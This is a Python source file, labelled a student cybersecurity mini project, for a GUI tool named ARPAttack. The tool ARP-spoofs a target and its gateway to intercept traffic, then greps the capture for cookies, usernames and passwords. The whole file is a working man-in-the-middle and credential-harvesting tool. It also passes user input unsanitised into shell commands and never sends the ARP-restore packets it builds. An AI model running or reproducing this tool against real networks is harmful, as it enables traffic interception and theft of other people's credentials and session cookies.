'''
Cybersecurity Mini Project (2020-2021)

Group Members:
Joel Eldoe
Sahil Kohinkar
Omkar Jagtap
Vishal Sarode
'''

from scapy.all import *         # To use scapy's tools
import os, time                 # To execute system commands and to use the sleep function
from tkinter import *           # To create a GUI for the application
from tkinter import messagebox  # To execute pop-up messages
import tkinter.font as tkFont   # To use different fonts
conf.verb = 0                   # To hide the verbose data generated by scapy

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  #GREEN COLOR
    RESET = '\033[0m'   #RESET COLOR

# For data validation
def check_values(target_IP, gateway_IP, project_name):
    flag = False
    analysis_file = ""
    if(not((len(target_IP) == 0) or (len(gateway_IP) == 0) or (len(project_name) == 0))):
        if(len(target_IP.split(".")) == 4 and len(gateway_IP.split(".")) == 4):
            flag = True
            if(len(project_name.split(".")) == 2):
                if(project_name.split(".")[1] != "pcap"):
                    analysis_file = project_name + "_analysis.txt"
                else:
                    analysis_file = project_name.split(".")[0] + "_analysis.txt"
            else:
                analysis_file = project_name + "_analysis.txt"

            # Enabling IP forwarding
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        else:
            messagebox.showerror("Error!","Invalid IP address.\nOnly IPv4 allowed") 
        return project_name, analysis_file, flag
    else:
        messagebox.showwarning(title="Warning!", message="Complete all the fields to proceed")

# Function to create an analysis file of the packets captured
def create_log(project_name, analysis_file):
    os.system('echo "----- SHORT ANALYSIS OF THE SNIFFED DATA -----" >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nTOTAL URLs ENCOUNTERED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' + ' | grep .com >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nMAIN WEBSITES VISITED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep Referer >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nCOOKIES CAPTURED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep Cookie >> ' + project_name+'/'+analysis_file)
    os.system('echo "\nPOSSIBLE CREDENTIALS CAPTURED:" >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep username >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep user >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep uname >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep password >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep pwd >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep passwd >> ' + project_name+'/'+analysis_file)
    os.system('strings '+ project_name+'/'+project_name+'.pcap' +' | grep pass >> ' + project_name+'/'+analysis_file)

# Function to get the MAC address using ARP requests
def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5)[0]
    return answered_list[0][1].hwsrc

# Function to carry out MITM
def attack():
    target_IP = target_input.get()
    gateway_IP = gateway_input.get()
    project_name = project_input.get()
    
    project_name, analysis_file, flag = check_values(target_IP, gateway_IP, project_name)

    if(flag):
        sniff_time = int(sniff_time_input.get())
        messagebox.showinfo(title="Message", message="Initiating Man-In-The-Middle Attack...")
        target_MAC = get_mac(target_IP)
        gateway_MAC = get_mac(gateway_IP)
        packets_sent = 0

        sniffer = AsyncSniffer(filter='tcp')
        sniffer.start()
        while(sniff_time > 0):
            pkt1 = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP)
            pkt2 = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP)
            send(pkt1)
            send(pkt2)
            packets_sent += 2
            time.sleep(1)
            sniff_time -= 1
        
        sniffer.stop()
        data = sniffer.results
        pkt3 = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, hwsrc=target_MAC, psrc=target_IP)
        pkt4 = ARP(op=2, pdst=target_IP, hwdst=target_MAC, hwsrc=gateway_MAC, psrc=gateway_IP)

        if(len(data) == 0):
            messagebox.showinfo(title="Result", message="No data sniffed!")
        else:
            os.system('mkdir ' + project_name)
            for i in range(len(data)):
                wrpcap(project_name+'/'+project_name+'.pcap', data[i], append=True)
            
            create_log(project_name, analysis_file)
            messagebox.showinfo(title="Result", message=f"Attack completed!\n{packets_sent} ARP packets sent in total\nResults saved in {project_name} directory")

# Main program
root = Tk()
root.configure(bg='#242B2E')
root.geometry('800x300')
root.title('ARPAttack')

font_style1 = tkFont.Font(family='Candara', size=16)
font_style2 = tkFont.Font(family='Verdana', size=14)

frame = Frame(root, borderwidth=1, relief=FLAT, background='#242B2E')
frame.pack(fill='y')

blank1 = Label(frame, pady='5', bg='#242B2E')
blank1.grid(row='0', column='0', columnspan='2')

target_label = Label(frame, text="Enter the target's IP: ", font=font_style2, bg='#242B2E', fg='#CAD5E2')
target_label.grid(row='1', column='0', padx='20', pady='5')
target_input = Entry(frame, width='25', font=font_style2)
target_input.grid(row='1', column='1',padx='5', pady='5')

gateway_label = Label(frame, text="Enter the gateway IP: ", font=font_style2, bg='#242B2E', fg='#CAD5E2')
gateway_label.grid(row='2', column='0', padx='20', pady='5')
gateway_input = Entry(frame, width='25', font=font_style2)
gateway_input.grid(row='2', column='1',padx='5', pady='5')

sniff_time_label = Label(frame, text="How long should it sniff? (in seconds):", font=font_style2, bg='#242B2E', fg='#CAD5E2')
sniff_time_label.grid(row='3', column='0', padx='20', pady='5')
sniff_time_input = Entry(frame, width='25', font=font_style2)
sniff_time_input.grid(row='3', column='1',padx='5', pady='5')

project_label = Label(frame, text="Enter the name of the project: ", font=font_style2, bg='#242B2E', fg='#CAD5E2')
project_label.grid(row='4', column='0', padx='20', pady='5')
project_input = Entry(frame, width='25', font=font_style2)
project_input.grid(row='4', column='1',padx='5', pady='5')

blank2 = Label(frame, pady='5', bg='#242B2E')
blank2.grid(row='5', column='0', columnspan='2')

attack_button = Button(frame, text="Attack", font=font_style2, bg='#CAD5E2',command=attack)
attack_button.grid(row='6', column='0', padx='10', pady='10')

terminate_button = Button(frame, text="Terminate", font=font_style2, bg='#CAD5E2', command=root.quit)
terminate_button.grid(row='6', column='1', padx='10', pady='10')

root.mainloop()

print(f"[{colors.GREEN}+{colors.RESET}] Quitting\n")
# End of program